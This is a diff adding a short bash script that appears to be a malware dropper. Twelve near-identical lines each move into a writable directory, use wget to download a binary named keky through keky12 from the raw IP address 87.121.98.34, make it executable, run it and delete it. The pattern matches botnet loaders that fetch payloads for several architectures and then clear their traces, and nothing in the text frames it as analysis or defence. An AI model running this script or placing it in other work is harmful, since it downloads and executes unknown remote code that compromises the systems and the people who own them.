@@ -1,0 +1,13 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.121.98.34/keky; chmod +x keky; ./keky; rm -rf keky
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.121.98.34/keky2; chmod +x keky2; ./keky2; rm -rf keky2
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.121.98.34/keky3; chmod +x keky3; ./keky3; rm -rf keky3
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.121.98.34/keky4; chmod +x keky4; ./keky4; rm -rf keky4
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.121.98.34/keky5; chmod +x keky5; ./keky5; rm -rf keky5
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.121.98.34/keky6; chmod +x keky6; ./keky6; rm -rf keky6
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.121.98.34/keky7; chmod +x keky7; ./keky7; rm -rf keky7
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.121.98.34/keky8; chmod +x keky8; ./keky8; rm -rf keky8
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.121.98.34/keky9; chmod +x keky9; ./keky9; rm -rf keky9
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.121.98.34/keky10; chmod +x keky10; ./keky10; rm -rf keky10
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.121.98.34/keky11; chmod +x keky11; ./keky11; rm -rf keky11
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.121.98.34/keky12; chmod +x keky12; ./keky12; rm -rf keky12
